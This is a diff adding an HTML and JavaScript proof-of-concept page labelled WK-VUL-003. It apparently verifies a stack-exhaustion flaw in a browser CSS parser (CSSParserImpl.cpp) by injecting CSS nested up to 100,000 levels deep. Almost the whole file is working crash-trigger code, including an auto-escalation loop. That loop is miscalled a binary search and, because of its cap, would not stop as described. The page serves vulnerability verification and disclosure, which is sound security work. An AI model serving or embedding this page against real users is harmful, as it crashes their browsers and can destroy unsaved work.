@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WK-VUL-003 — CSS Nesting Stack Exhaustion PoC</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 2em; }
+#controls { margin-bottom: 1em; }
+button { padding: 0.5em 1.5em; margin-right: 0.5em; cursor: pointer; font-size: 1.1em; }
+button:disabled { opacity: 0.4; cursor: not-allowed; }
+#log { white-space: pre-wrap; font-size: 0.85em; max-height: 60vh; overflow-y: auto;
+       background: #0f0f1a; padding: 1em; border: 1px solid #333; border-radius: 4px; }
+.warn { color: #ff6b6b; }
+.ok { color: #51cf66; }
+.info { color: #74c0fc; }
+</style>
+</head>
+<body>
+<h2>WK-VUL-003 Verification</h2>
+<p>This tests whether <code>m_styleRuleNestingLevel</code> in CSSParserImpl.cpp lacks an upper bound,
+   causing unbounded C++ recursion when parsing deeply nested CSS rules.</p>
+<div id="controls">
+  <button id="btn500">500 levels</button>
+  <button id="btn2k">2,000 levels</button>
+  <button id="btn10k">10,000 levels</button>
+  <button id="btn50k">50,000 levels</button>
+  <button id="btnAuto">Auto-detect crash point</button>
+</div>
+<p id="status"></p>
+<div id="log"></div>
+
+<script>
+const log = document.getElementById('log');
+const statusEl = document.getElementById('status');
+
+function logMsg(text, cls) {
+    const span = document.createElement('span');
+    span.className = cls || '';
+    span.textContent = text + '\n';
+    log.appendChild(span);
+    log.scrollTop = log.scrollHeight;
+}
+
+function disableAll() {
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+}
+
+/**
+ * Generate a CSS string with `depth` levels of nested selectors.
+ * Each level adds ~4 bytes: ".a{"
+ * Closing braces are appended at the end.
+ *
+ * The parsing recursion chain is:
+ *   consumeQualifiedRule → consumeStyleRule → runInNewNestingContext →
+ *     NestingLevelIncrementer{m_styleRuleNestingLevel} →
+ *     consumeStyleBlock → consumeDeclarationListOrStyleBlockHelper →
+ *     consumeQualifiedRule [line 1171]
+ *
+ * m_ruleListNestingLevel has a limit of 128, but m_styleRuleNestingLevel
+ * has NO upper-bound check in the audited source.
+ */
+function generateNestedCSS(depth) {
+    const open = '.a{'.repeat(depth);
+    const close = '}'.repeat(depth);
+    // Add a dummy property at the innermost level to ensure it parses as a valid rule
+    return open + 'color:red' + close;
+}
+
+/**
+ * Attempt to inject CSS at a given nesting depth.
+ * Returns true if the browser survived (no crash).
+ */
+function testDepth(depth) {
+    logMsg(`\n--- Testing depth: ${depth.toLocaleString()} ---`, 'info');
+    statusEl.textContent = `Testing depth ${depth.toLocaleString()}...`;
+
+    const css = generateNestedCSS(depth);
+    logMsg(`Generated CSS: ${css.length.toLocaleString()} bytes`);
+
+    try {
+        const style = document.createElement('style');
+        style.textContent = css;
+        document.head.appendChild(style);
+
+        // If we reach here, the parser survived.
+        // Verify it actually applied by checking a computed style.
+        const testDiv = document.createElement('div');
+        testDiv.className = 'a';
+        document.body.appendChild(testDiv);
+        const color = getComputedStyle(testDiv).color;
+        document.body.removeChild(testDiv);
+
+        // Clean up
+        document.head.removeChild(style);
+
+        if (color === 'rgb(255, 0, 0)') {
+            logMsg(`✓ Parsed successfully — color matched: "${color}"`, 'ok');
+            statusEl.textContent = `Depth ${depth.toLocaleString()}: survived`;
+            return true;
+        } else {
+            logMsg(`⚠ Parsed without crash but color unexpected: "${color}" (likely hit limit gracefully)`, 'warn');
+            statusEl.textContent = `Depth ${depth.toLocaleString()}: survived (parse error)`;
+            return true;
+        }
+    } catch (e) {
+        logMsg(`⚠ JS exception (not crash): ${e.message}`, 'warn');
+        statusEl.textContent = `Depth ${depth.toLocaleString()}: JS error`;
+        return true; // Didn't crash the process
+    }
+}
+
+// --- Button handlers ---
+
+document.getElementById('btn500').onclick = () => { disableAll(); testDepth(500); };
+document.getElementById('btn2k').onclick  = () => { disableAll(); testDepth(2000); };
+document.getElementById('btn10k').onclick = () => { disableAll(); testDepth(10000); };
+document.getElementById('btn50k').onclick = () => { disableAll(); testDepth(50000); };
+
+// Auto-detect: binary search for the crash threshold
+document.getElementById('btnAuto').onclick = () => {
+    disableAll();
+    statusEl.textContent = 'Auto-detecting crash point...';
+    logMsg('=== Auto-detect mode ===\nWill incrementally increase depth until crash.\n', 'info');
+    logMsg('If the browser process terminates at any point, that IS the proof of WK-VUL-003.\n', 'warn');
+
+    let depth = 100;
+    const maxDepth = 100000;
+    const multiplier = 2;
+
+    function step() {
+        if (depth > maxDepth) {
+            logMsg(`\nReached maxDepth ${maxDepth.toLocaleString()} without crash.`, 'ok');
+            logMsg('Conclusion: WK-VUL-003 may be PATCHED in this build, or stack is very large.', 'ok');
+            statusEl.textContent = 'Auto-detect complete: no crash found';
+            return;
+        }
+        // Use setTimeout so the browser can paint the log before the heavy parse
+        setTimeout(() => {
+            try {
+                testDepth(depth);
+                depth = Math.min(depth * multiplier, maxDepth);
+                step();
+            } catch (e) {
+                logMsg(`Unexpected error at depth ${depth}: ${e.message}`, 'warn');
+            }
+        }, 100);
+    }
+    step();
+};
+
+logMsg('WK-VUL-003 PoC loaded.\nTarget: CSSParserImpl.cpp — m_styleRuleNestingLevel has no upper bound.\n\nSelect a depth to test, or use Auto-detect.\n', 'info');
+logMsg('⚠ WARNING: Depths ≥10,000 may crash the browser process. Save any work first.\n', 'warn');
+</script>
+</body>
+</html>
